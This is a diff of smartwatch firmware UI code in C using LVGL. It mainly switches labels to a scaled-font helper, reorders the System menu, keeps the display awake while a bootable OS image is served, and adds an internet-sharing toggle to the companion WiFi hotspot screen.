+            if (sc_apply_utc(u.tm_year + 1900, u.tm_mon + 1, u.tm_mday, u.tm_hour, u.tm_min, u.tm_sec)) {
+                last_ms = lv_tick_get(); have_last = true;
+            }
+        }
+        return;
+    }
+    if (have_last && (uint32_t)(lv_tick_get() - last_ms) < 600000u) return;   /* NTP fresh (<10 min) */
+    nocsif_gnss_fix_t f;
+    if (nocsif_gnss_fix_snapshot(&f) && f.valid && f.year && f.fix_age_ms <= 5000) {
+        if (sc_apply(&f)) { last_ms = lv_tick_get(); have_last = true; }
+    }
 }
 
 static void sc_sync_cb(lv_event_t *e)
@@ -18392,7 +21703,7 @@ static void alarms_pool_row(lv_obj_t *parent, int i)
     lv_obj_set_flex_flow(lc, LV_FLEX_FLOW_COLUMN);
     lv_obj_clear_flag(lc, LV_OBJ_FLAG_SCROLLABLE);
     s_al_time[i] = lv_label_create(lc);
-    lv_obj_set_style_text_font(s_al_time[i], &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_al_time[i], &nocsif_mono_18);
     lv_obj_set_style_text_color(s_al_time[i], NOCSIF_WHITE, 0);
     s_al_cap[i] = lv_label_create(lc);
     lv_obj_add_style(s_al_cap[i], &nocsif_style_font_tag_small, 0);
@@ -18411,7 +21722,7 @@ static void alarms_pool_row(lv_obj_t *parent, int i)
     lv_obj_add_event_cb(tg, alarm_toggle_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
     s_al_tgl[i] = tg;
     s_al_tgl_lbl[i] = lv_label_create(tg);
-    lv_obj_set_style_text_font(s_al_tgl_lbl[i], &nocsif_mono_14, 0);
+    nocsif_label_font_scaled(s_al_tgl_lbl[i], &nocsif_mono_14);
 
     s_al_row[i] = row;
     s_al_sig[i] = -1;
@@ -18985,7 +22296,7 @@ static lv_obj_t *files_make_view_screen(const char *path)
 
     lv_obj_t *box = lv_label_create(content);
     lv_obj_set_width(box, lv_pct(100));
-    lv_obj_set_style_text_font(box, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(box, &nocsif_mono_11);
     lv_obj_set_style_text_color(box, NOCSIF_BONE, 0);
     lv_obj_set_style_pad_all(box, 8, 0);
     lv_label_set_long_mode(box, LV_LABEL_LONG_WRAP);
@@ -19710,18 +23021,18 @@ static lv_obj_t *build_autom(void)
     return scr;
 }
 
-/* Redesign: System top level is alphabetical. Watch Name / Theme / Type scale moved into Display;
- * Microphone + Sound into the new Audio hub; Diagnostics into About. */
-static const rowspec_t k_system_rows[] = {   /* alphabetical by label */
-        { "system.about",   "About",          NOCSIF_ICON_STAR,    NULL,  NOCSIF_TAG_NONE },
+/* Redesign: System top level is submenus-first-then-leaves, alphabetical within each group. Watch Name /
+ * Theme / Type scale moved into Display; Microphone + Sound into the new Audio hub; Diagnostics into About. */
+static const rowspec_t k_system_rows[] = {
         /* Audio hub — Microphone + Sound. */
         { "system.audio",   "Audio",          NOCSIF_ICON_SPEAKER, NULL,  NOCSIF_TAG_NONE },
+        /* Display now holds Home / Watchface / Theme / Type scale / Watch Name (redesign). */
+        { "system.display", "Display",        NOCSIF_ICON_SYS,     NULL,  NOCSIF_TAG_NONE },
+        { "system.about",   "About",          NOCSIF_ICON_STAR,    NULL,  NOCSIF_TAG_NONE },
         /* Buttons drills to the FN/PWR shortcut config (P4.4b). */
         { "system.buttons", "Buttons",        NOCSIF_ICON_KEY,     NULL,  NOCSIF_TAG_NONE },
         /* §4.8a — Companion moved out of System; it now lives under Life and Cyber > WiFi. */
         { "system.conn",    "Connectivity",   NOCSIF_ICON_WIFI,    NULL,  NOCSIF_TAG_NONE },
-        /* Display now holds Home / Watchface / Theme / Type scale / Watch Name (redesign). */
-        { "system.display", "Display",        NOCSIF_ICON_SYS,     NULL,  NOCSIF_TAG_NONE },
         { "files",          "Files",          NOCSIF_ICON_FOLDER,  NULL,  NOCSIF_TAG_NONE },
         { "autom",          "GeoFence",       NOCSIF_ICON_AUTO,    NULL,  NOCSIF_TAG_NONE },
         /* PIN Lock's tag reads the passcode-present state and drills to the keypad. */
@@ -20003,6 +23314,12 @@ static void peek_idle_cb(lv_timer_t *t)
 {
     (void)t;
     if (s_booting) {
+        return;
+    }
+    /* Bootable OS: while serving an image to a PC, suspend ALL auto-sleep (the black overlay must stay
+     * up and the watch awake the whole time the host is booting). Any swipe exits (bootos_overlay). */
+    if (nocsif_bootos_active()) {
+        lv_display_trigger_activity(NULL);
         return;
     }
     uint32_t inact = lv_display_get_inactive_time(NULL);
@@ -21036,7 +24353,7 @@ static lv_obj_t *build_color_picker(void)
     } else {
         lv_obj_t *err = lv_label_create(box);
         lv_label_set_text(err, "wheel alloc failed");
-        lv_obj_set_style_text_font(err, &nocsif_mono_13, 0);
+        nocsif_label_font_scaled(err, &nocsif_mono_13);
         lv_obj_set_style_text_color(err, NOCSIF_ASH, 0);
         lv_obj_center(err);
     }
@@ -21102,7 +24419,7 @@ static lv_obj_t *build_color_picker(void)
     lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
     lv_obj_set_width(hint, NOCSIF_DISP_W - 60);
     lv_obj_set_style_text_align(hint, LV_TEXT_ALIGN_CENTER, 0);
-    lv_obj_set_style_text_font(hint, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(hint, &nocsif_mono_11);
     lv_obj_set_style_text_color(hint, NOCSIF_ASH, 0);
     lv_obj_set_style_margin_top(hint, 14, 0);
 
@@ -21956,7 +25273,7 @@ static lv_obj_t *build_weather(void)
     lv_label_set_text(s_wx_banner,
                       "No location yet.\nCapture from GPS below (or open any Location screen outside) "
                       "\xE2\x80\x93 Weather remembers your last fix and fetches over WiFi.");
-    lv_obj_set_style_text_font(s_wx_banner, &nocsif_mono_14, 0);
+    nocsif_label_font_scaled(s_wx_banner, &nocsif_mono_14);
     lv_obj_set_style_text_color(s_wx_banner, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_top(s_wx_banner, 6, 0);
 
@@ -21980,7 +25297,7 @@ static lv_obj_t *build_weather(void)
 
     s_wx_sign = lv_label_create(hero);
     lv_label_set_text(s_wx_sign, "-");
-    lv_obj_set_style_text_font(s_wx_sign, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_wx_sign, &nocsif_mono_18);
     lv_obj_set_style_text_color(s_wx_sign, NOCSIF_WHITE, 0);
     lv_obj_set_style_pad_top(s_wx_sign, 10, 0);
     lv_obj_add_flag(s_wx_sign, LV_OBJ_FLAG_HIDDEN);
@@ -21992,7 +25309,7 @@ static lv_obj_t *build_weather(void)
 
     s_wx_deg = lv_label_create(hero);
     lv_label_set_text(s_wx_deg, "\xC2\xB0""F");
-    lv_obj_set_style_text_font(s_wx_deg, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_wx_deg, &nocsif_mono_18);
     lv_obj_set_style_text_color(s_wx_deg, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_top(s_wx_deg, 8, 0);
 
@@ -22391,7 +25708,7 @@ static lv_obj_t *ota_button(lv_obj_t *content, lv_event_cb_t cb, int gap_top)
     lv_obj_set_style_pad_bottom(b, 15, 0);
     lv_obj_add_event_cb(b, cb, LV_EVENT_CLICKED, NULL);
     lv_obj_t *l = lv_label_create(b);
-    lv_obj_set_style_text_font(l, &nocsif_mono_18, 0);      /* a bigger label */
+    nocsif_label_font_scaled(l, &nocsif_mono_18);      /* bigger label */
     return l;
 }
 
@@ -22740,6 +26057,7 @@ static lv_obj_t *s_comp_qr, *s_comp_qr_box;   /* §4.8a — scan-to-join QR (the
 static lv_obj_t *s_comp_qr_cap, *s_comp_qr_btn; /* the QR caption + the join/website toggle button's label */
 static bool      s_comp_qr_site;               /* false = WIFI: join payload, true = the site URL (two scans) */
 static lv_obj_t *s_comp_auto_acc, *s_comp_pw_acc;   /* live tags: auto-start on/off · password set/none */
+static lv_obj_t *s_comp_share_acc;                  /* live tag: internet sharing on/off */
 static bool      s_comp_killed_bt;                  /* we turned Bluetooth off for this mirror session   */
 
 #define COMP_K_AUTO "comp_auto"    /* persisted: auto-raises the companion on boot (0/1) */
@@ -22769,7 +26087,8 @@ static void companion_set_on(bool on)
 }
 
 /* Start-warning modal: a scrim + card on lv_layer_top (mirrors wifi_ap_popup) telling the operator that
- * the mirror turns Bluetooth and WiFi off. Continue → companion_set_on(true); Cancel/scrim → dismiss. */
+ * the mirror turns Bluetooth off and hotspots the watch (WiFi stays up to share internet). Continue →
+ * companion_set_on(true); Cancel/scrim → dismiss. */
 static lv_obj_t *s_comp_warn_ov;
 static void comp_warn_close(void)
 {
@@ -22812,7 +26131,7 @@ static void companion_warn_popup(void)
 
     lv_obj_t *title = lv_label_create(card);
     lv_label_set_text(title, "Start live mirror?");
-    lv_obj_set_style_text_font(title, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(title, &nocsif_mono_18);
     lv_obj_set_style_text_color(title, NOCSIF_WHITE, 0);
     lv_obj_set_style_text_align(title, LV_TEXT_ALIGN_CENTER, 0);
 
@@ -22820,8 +26139,9 @@ static void companion_warn_popup(void)
     lv_label_set_long_mode(body, LV_LABEL_LONG_WRAP);
     lv_obj_set_width(body, lv_pct(100));
     lv_label_set_text(body,
-        "This turns OFF Bluetooth and the watch's WiFi while the mirror runs " NOCSIF_NDASH " the watch "
-        "becomes a WiFi hotspot your phone joins. Both come back when you stop the mirror.");
+        "This turns OFF Bluetooth while the mirror runs " NOCSIF_NDASH " the watch becomes a WiFi hotspot "
+        "your phone joins, and keeps its own WiFi so the phone shares the watch's internet. Bluetooth "
+        "comes back when you stop the mirror.");
     lv_obj_add_style(body, &nocsif_style_font_caption, 0);
     lv_obj_set_style_text_color(body, NOCSIF_WHITE, 0);
     lv_obj_set_style_text_align(body, LV_TEXT_ALIGN_CENTER, 0);
@@ -22849,7 +26169,7 @@ static void companion_start_cb(lv_event_t *e)
     if (nocsif_wifi_companion_active()) {
         companion_set_on(false);   /* Stop is immediate (and restores Bluetooth) */
     } else {
-        companion_warn_popup();    /* Start is gated behind the "kills BLE + WiFi" confirm */
+        companion_warn_popup();    /* Start is gated behind the "turns Bluetooth off, hotspots WiFi" confirm */
     }
 }
 
@@ -22867,6 +26187,25 @@ static void companion_autostart_cb(lv_timer_t *t)
     lv_timer_del(t);   /* a one-shot */
     if (nocsif_reliability_safe_mode()) return;         /* the companion takes the radio, never in safe mode */
     if (nocsif_settings_get_i32(COMP_K_AUTO, 0)) companion_set_on(true);
+}
+
+/* Share internet: a persisted toggle (wifi.c owns the NVS key + applies it live). When on, the mirror AP
+ * runs in APSTA + NAPT so a phone joined to it reaches the internet whenever the watch's WiFi is linked. */
+static const char *companion_share_tag(void)
+{
+    if (!nocsif_wifi_companion_share_wanted()) return "off";
+    /* The WiFi buffer profile is fixed at boot: lean (no 802.11n aggregation) unless Companion
+     * auto-start was persisted, which arms the throughput profile (see main.c). On the lean profile
+     * both the mirror and the shared uplink are slow, so say so — the cure is Auto-start + a reboot. */
+    if (!nocsif_wifi_gateway_profile_armed()) return "on \xC2\xB7 slow";
+    return nocsif_wifi_companion_sharing() ? "live" : "on";   /* "live" once actually forwarding */
+}
+static void companion_share_cb(lv_event_t *e)
+{
+    (void)e;
+    bool nx = !nocsif_wifi_companion_share_wanted();
+    nocsif_wifi_companion_set_share(nx);                 /* persists + applies live on the WiFi worker */
+    if (s_comp_share_acc) wifi_set_label(s_comp_share_acc, nx ? "on" : "off");
 }
 
 /* §4.8a — scan-to-join QR. Encodes the SoftAP as a standard `WIFI:` payload so a phone camera joins the
@@ -22916,6 +26255,7 @@ static void companion_tick(lv_timer_t *t)
     /* reveals the join details only while it's up */
     if (s_comp_ssid_v) wifi_set_label(s_comp_ssid_v, on ? nocsif_wifi_companion_ssid() : NOCSIF_NDASH);
     if (s_comp_url_v)  wifi_set_label(s_comp_url_v,  on ? nocsif_wifi_companion_url()  : NOCSIF_NDASH);
+    if (s_comp_share_acc) wifi_set_label(s_comp_share_acc, companion_share_tag());   /* on -> live once forwarding */
     companion_qr_refresh(on);
 }
 
@@ -22925,7 +26265,7 @@ static void companion_deleted_cb(lv_event_t *e)
     comp_warn_close();   /* never leave the start-warning modal on lv_layer_top after nav-away */
     s_comp_status = s_comp_start_lbl = s_comp_ssid_v = s_comp_url_v = NULL;
     s_comp_qr = s_comp_qr_box = s_comp_qr_cap = s_comp_qr_btn = NULL;
-    s_comp_auto_acc = s_comp_pw_acc = NULL;
+    s_comp_auto_acc = s_comp_pw_acc = s_comp_share_acc = NULL;
 }
 
 /* ---- section 4.8a companion: the AP password editor
@@ -23327,6 +26667,9 @@ static lv_obj_t *build_companion(void)
     /* auto-start on boot plus the AP password, operator additions */
     wifi_menu_row(content, "Auto-start on boot", NOCSIF_BONE, companion_auto_tag(), &s_comp_auto_acc,
                   companion_auto_cb, NULL);
+    /* Share internet: give the joined phone the watch's uplink (APSTA + NAPT) while the mirror runs. */
+    wifi_menu_row(content, "Share internet", NOCSIF_BONE, companion_share_tag(), &s_comp_share_acc,
+                  companion_share_cb, NULL);
     {
         char pw[64];
         nocsif_settings_get_str(COMP_K_PW, pw, sizeof pw, "");
@@ -23390,7 +26733,8 @@ static lv_obj_t *build_companion(void)
     lv_obj_set_style_pad_top(sec, 12, 0);
     lv_label_set_text(sec, "set a Password for WPA2, or leave it open " NOCSIF_DOT
                            " an open AP lets anyone who joins control the watch " NOCSIF_DOT
-                           " Bluetooth + WiFi turn OFF while the mirror runs (restored on Stop) " NOCSIF_DOT
+                           " Share internet gives the joined phone the watch's uplink " NOCSIF_DOT
+                           " Bluetooth turns OFF while the mirror runs (restored on Stop) " NOCSIF_DOT
                            " authorized use");
 
     lv_timer_t *timer = lv_timer_create(companion_tick, 500, NULL);
@@ -24117,7 +27461,7 @@ static lv_obj_t *tuner_screen(const char *title, const char *cap, int instr)
     lv_label_set_text(s_tuner.verdict, "play a note");
     lv_obj_set_width(s_tuner.verdict, lv_pct(100));
     lv_obj_set_style_text_align(s_tuner.verdict, LV_TEXT_ALIGN_CENTER, 0);
-    lv_obj_set_style_text_font(s_tuner.verdict, &nocsif_mono_20, 0);
+    nocsif_label_font_scaled(s_tuner.verdict, &nocsif_mono_20);
     lv_obj_set_style_text_color(s_tuner.verdict, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_top(s_tuner.verdict, 2, 0);
 
@@ -24809,7 +28153,7 @@ static void keypad_populate(lv_obj_t *content, const char *status0)
 
     s_pin_dots = lv_label_create(content);
     lv_label_set_text(s_pin_dots, "");
-    lv_obj_set_style_text_font(s_pin_dots, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(s_pin_dots, &nocsif_mono_18);
     lv_obj_set_style_text_color(s_pin_dots, NOCSIF_BONE, 0);
     lv_obj_set_style_pad_left(s_pin_dots, UI_LIST_INSET, 0);
     lv_obj_set_style_pad_top(s_pin_dots, 6, 0);
@@ -24817,7 +28161,7 @@ static void keypad_populate(lv_obj_t *content, const char *status0)
 
     s_pin_status = lv_label_create(content);
     lv_label_set_text(s_pin_status, status0);
-    lv_obj_set_style_text_font(s_pin_status, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_pin_status, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_pin_status, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_left(s_pin_status, UI_LIST_INSET, 0);
     lv_obj_set_style_pad_bottom(s_pin_status, 10, 0);
@@ -24879,7 +28223,7 @@ static lv_obj_t *build_pin(void)
         lv_obj_add_event_cb(rm, pin_remove_cb, LV_EVENT_CLICKED, NULL);
         lv_obj_t *rl = lv_label_create(rm);
         lv_label_set_text(rl, "Remove passcode");
-        lv_obj_set_style_text_font(rl, &nocsif_mono_14, 0);
+        nocsif_label_font_scaled(rl, &nocsif_mono_14);
         lv_obj_set_style_text_color(rl, NOCSIF_STEEL, 0);
     }
     return scr;
@@ -25145,7 +28489,7 @@ static void add_planet(lv_obj_t *parent, const peek_planet_t *pl)
 
     lv_obj_t *lb = lv_label_create(c);
     lv_label_set_text(lb, pl->label);
-    lv_obj_set_style_text_font(lb, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(lb, &nocsif_mono_13);
     lv_obj_set_style_text_color(lb, NOCSIF_ASH, 0);
     lv_obj_set_style_text_letter_space(lb, 1, 0);
 }
@@ -25515,7 +28859,7 @@ static lv_obj_t *car_make_planet(lv_obj_t *parent, const car_dial_t *d, int i) {
     lv_obj_set_width(lb, d->ring ? CAR_RINGSZ : (int)CAR_SZMAX);
     lv_label_set_long_mode(lb, LV_LABEL_LONG_DOT);
     lv_obj_set_style_text_align(lb, LV_TEXT_ALIGN_CENTER, 0);
-    lv_obj_set_style_text_font(lb, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(lb, &nocsif_mono_13);
     lv_obj_set_style_text_color(lb, NOCSIF_ASH, 0);
     lv_obj_set_style_text_letter_space(lb, 1, 0);
 
@@ -26369,7 +29713,7 @@ static void iconpick_open(car_dial_t *d, int slot)
 
     lv_obj_t *hint = lv_label_create(ov);
     lv_label_set_text(hint, "tap an icon " NOCSIF_DOT " swipe to close");
-    lv_obj_set_style_text_font(hint, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(hint, &nocsif_mono_12);
     lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
     lv_obj_align(hint, LV_ALIGN_TOP_MID, 0, 84);
 
@@ -28018,7 +31362,7 @@ static void cc_flashlight_open(void)
         lv_obj_add_event_cb(s_cc_flash, cc_flash_tap_cb, LV_EVENT_CLICKED, NULL);
         lv_obj_t *hint = lv_label_create(s_cc_flash);
         lv_label_set_text(hint, "tap to exit");
-        lv_obj_set_style_text_font(hint, &nocsif_mono_12, 0);
+        nocsif_label_font_scaled(hint, &nocsif_mono_12);
         lv_obj_set_style_text_color(hint, lv_color_hex(0x9A9AA0), 0);
         lv_obj_align(hint, LV_ALIGN_BOTTOM_MID, 0, -40);
     }
@@ -28346,12 +31690,12 @@ static void build_control_center(void)
     lv_obj_set_style_pad_row(mtxt, 3, 0);
     lv_obj_t *ms = lv_label_create(mtxt);
     lv_label_set_text(ms, "MEDIA");
-    lv_obj_set_style_text_font(ms, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(ms, &nocsif_mono_11);
     lv_obj_set_style_text_color(ms, NOCSIF_ASH, 0);
     lv_obj_set_style_text_letter_space(ms, 2, 0);
     lv_obj_t *mt = lv_label_create(mtxt);
     lv_label_set_text(mt, "Nothing playing");
-    lv_obj_set_style_text_font(mt, &nocsif_mono_15, 0);
+    nocsif_label_font_scaled(mt, &nocsif_mono_15);
     lv_obj_set_style_text_color(mt, NOCSIF_BONE, 0);
     s_cc_mt = mt;   /* (M7 AMS) live now-playing, updated by cc_media_tick while the shade is open */
 
@@ -28565,9 +31909,10 @@ static bool app_id_live(const char *id)
 {
     if (!id) return false;
     if (strcmp(id, "wifi")  == 0) return nocsif_wifi_connected();
-    if (strcmp(id, "ble")   == 0) { nocsif_radio_state_t rs; nocsif_radio_state(&rs); return rs.ble_link_live; }  /* a real phone link, previously a dead s_cc_ble stub */
-    if (strcmp(id, "usb")   == 0) return usb_hid_badge_str()[0] != '\0';
-    /* Cyber (the moon) glows only for active background scanning — the WiFi monitor/capture or a BLE scan/sniff — not for a plain connection. A live WiFi/BLE link instead lights that radio's own row and planet (wifi/ble below). */
+    if (strcmp(id, "ble")   == 0) { nocsif_radio_state_t rs; nocsif_radio_state(&rs); return rs.ble_link_live; }  /* real phone link (was a dead s_cc_ble stub) */
+    if (strcmp(id, "usb")   == 0) return usb_hid_badge_str()[0] != '\0' || nocsif_webdl_busy();  /* HID armed OR a download in flight -> USB Gadget lit */
+    /* Cyber (moon) glows ONLY on active BACKGROUND scanning — WiFi monitor/capture or BLE scan/sniff — not
+     * for a plain connection. A live WiFi/BLE link instead lights that radio's own row + planet (wifi/ble below). */
     if (strcmp(id, "cyber") == 0) return nocsif_wifi_monitor_active() || nocsif_ble_scan_active() || nocsif_ble_pcap_active();
     if (strcmp(id, "alerts")== 0) return s_alog_n > 0;   /* the Alert Center holding alerts lights the planet/row icon */
     if (strcmp(id, "dnd")   == 0) return s_cc_dnd;       /* Do Not Disturb on lights the Life row icon */
@@ -28733,7 +32078,7 @@ static lv_obj_t *build_peek(void)
 
     lv_obj_t *wxt = lv_label_create(s_peek_wx);
     lv_label_set_text(wxt, peek_wx_str());
-    lv_obj_set_style_text_font(wxt, &nocsif_mono_15, 0);
+    nocsif_label_font_scaled(wxt, &nocsif_mono_15);
     lv_obj_set_style_text_color(wxt, NOCSIF_STEEL, 0);
     nocsif_nav_register_live_label(wxt, peek_wx_str);
 
@@ -28816,7 +32161,7 @@ static lv_obj_t *build_peek(void)
     lv_obj_t *bat = lv_label_create(scr);
     s_peek_batt = bat;
     lv_label_set_text(bat, nocsif_power_batt_str());
-    lv_obj_set_style_text_font(bat, &nocsif_mono_15, 0);
+    nocsif_label_font_scaled(bat, &nocsif_mono_15);
     lv_obj_set_style_text_color(bat, NOCSIF_STEEL, 0);
     lv_obj_add_flag(bat, LV_OBJ_FLAG_GESTURE_BUBBLE);
     nocsif_nav_register_live_label(bat, nocsif_power_batt_str);
@@ -28867,7 +32212,7 @@ static lv_obj_t *build_peek(void)
 
     s_peek_act_lb = lv_label_create(s_peek_act);
     lv_label_set_text(s_peek_act_lb, "");
-    lv_obj_set_style_text_font(s_peek_act_lb, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(s_peek_act_lb, &nocsif_mono_13);
     lv_obj_set_style_text_color(s_peek_act_lb, NOCSIF_BONE, 0);
 
     /* the swipe-up affordance, an icon-font chevron up, bottom-center; peek_place_chrome hides it in bottom-arc */
@@ -28926,7 +32271,7 @@ static lv_obj_t *boot_add_line(const char *txt, lv_color_t color)
     }
     lv_obj_t *l = lv_label_create(s_boot_log);
     lv_obj_remove_style_all(l);
-    lv_obj_set_style_text_font(l, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(l, &nocsif_mono_13);
     lv_obj_set_style_text_color(l, color, 0);
     lv_label_set_text(l, txt);
     return l;
